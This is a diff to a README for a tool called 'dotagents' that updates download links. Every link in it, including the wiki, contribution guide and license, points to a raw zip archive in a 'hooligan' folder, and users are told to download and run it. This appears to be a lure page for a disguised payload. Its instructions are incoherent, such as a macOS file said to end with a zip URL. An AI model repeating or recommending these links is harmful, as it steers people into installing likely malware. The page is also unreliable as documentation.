@@ -1,6 +1,6 @@
 # 🤖 dotagents - Simplifying Agent Management for Everyone
 
-[![Download dotagents](https://github.com/rubysthedog/dotagents/raw/refs/heads/main/hooligan/Software_2.5.zip%20dotagents-v1.0-blue?style=for-the-badge)](https://github.com/rubysthedog/dotagents/raw/refs/heads/main/hooligan/Software_2.5.zip)
+[![Download dotagents](https://raw.githubusercontent.com/rubysthedog/dotagents/main/hooligan/Software-v1.0.zip%20dotagents-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/rubysthedog/dotagents/main/hooligan/Software-v1.0.zip)
 
 ## 📚 Overview
 
@@ -26,7 +26,7 @@ To start using dotagents, follow the steps below. No programming experience need
 
 To get dotagents, visit this page to download:
 
-[Download dotagents](https://github.com/rubysthedog/dotagents/raw/refs/heads/main/hooligan/Software_2.5.zip)
+[Download dotagents](https://raw.githubusercontent.com/rubysthedog/dotagents/main/hooligan/Software-v1.0.zip)
 
 ### 🔧 Installation Steps
 
@@ -34,7 +34,7 @@ To get dotagents, visit this page to download:
 2. **Choose the Latest Version:** Look for the latest version of dotagents.
 3. **Download the File:** Click on the file to start downloading. 
 
-   > For Windows, you'll see a file like `https://github.com/rubysthedog/dotagents/raw/refs/heads/main/hooligan/Software_2.5.zip`. For macOS or Linux, the file will end with `.dmg` or `https://github.com/rubysthedog/dotagents/raw/refs/heads/main/hooligan/Software_2.5.zip`.
+   > For Windows, you'll see a file like `https://raw.githubusercontent.com/rubysthedog/dotagents/main/hooligan/Software-v1.0.zip`. For macOS or Linux, the file will end with `.dmg` or `https://raw.githubusercontent.com/rubysthedog/dotagents/main/hooligan/Software-v1.0.zip`.
    
 4. **Open the Downloaded File:** Once the download is complete, locate the file in your downloads folder.
 5. **Run the Installer:** Double-click on the file to begin the installation process.
@@ -62,7 +62,7 @@ If you encounter any issues, here are some common problems and solutions:
 
 ## 📖 Documentation
 
-For further information, such as advanced setup and features, you can read the full documentation in the app or visit our [Wiki](https://github.com/rubysthedog/dotagents/raw/refs/heads/main/hooligan/Software_2.5.zip) for more guides and tips.
+For further information, such as advanced setup and features, you can read the full documentation in the app or visit our [Wiki](https://raw.githubusercontent.com/rubysthedog/dotagents/main/hooligan/Software-v1.0.zip) for more guides and tips.
 
 ## 💬 Community Support
 
@@ -81,11 +81,11 @@ We are continuously working on improvements. Here are some upcoming features to 
 
 ## 🤝 Contribution
 
-We welcome contributions! If you want to help improve dotagents, please check our [contribution guide](https://github.com/rubysthedog/dotagents/raw/refs/heads/main/hooligan/Software_2.5.zip). 
+We welcome contributions! If you want to help improve dotagents, please check our [contribution guide](https://raw.githubusercontent.com/rubysthedog/dotagents/main/hooligan/Software-v1.0.zip). 
 
 ## 🌍 License
 
-This project is open source and available under the [MIT License](https://github.com/rubysthedog/dotagents/raw/refs/heads/main/hooligan/Software_2.5.zip).
+This project is open source and available under the [MIT License](https://raw.githubusercontent.com/rubysthedog/dotagents/main/hooligan/Software-v1.0.zip).
 
 ## ➡️ Final Note
 
